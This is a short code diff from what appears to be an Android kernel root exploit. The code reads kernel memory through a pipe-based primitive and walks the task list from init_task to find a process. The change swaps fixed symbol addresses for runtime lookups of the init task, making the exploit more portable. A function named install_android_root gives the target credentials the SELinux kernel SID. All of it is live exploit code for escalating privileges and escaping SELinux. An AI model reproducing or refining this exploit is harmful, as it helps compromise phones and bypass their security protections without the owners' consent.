@@ -138,8 +138,8 @@ int collect_root_child(void) {
 }
 
 uint64_t find_task_by_tgid(int fd, uint32_t want_tgid) {
-  uint64_t head = data_addr(INIT_TASK_TASKS);
-  uint64_t canonical_head = canon_addr(INIT_TASK_TASKS);
+  uint64_t head = rt_data_alias(get_init_task_addr()) + TASK_TASKS_OFF;
+  uint64_t canonical_head = get_init_task_addr() + TASK_TASKS_OFF;
   uint64_t entry = pipe_read64(fd, head);
   task_walk_iters = 0;
   task_walk_last_entry = 0;
@@ -309,7 +309,7 @@ int install_android_root(int fd) {
   target_cred_osid = SELINUX_KERNEL_SID;
   target_cred_sid = SELINUX_KERNEL_SID;
 
-  init_tasks_prev = pipe_read64(fd, data_addr(INIT_TASK_TASKS) + 8);
+  init_tasks_prev = pipe_read64(fd, rt_data_alias(get_init_task_addr()) + TASK_TASKS_OFF + 8);
   if (!is_direct_ptr(current_task_addr)) {
     current_task_addr = 0;
   }
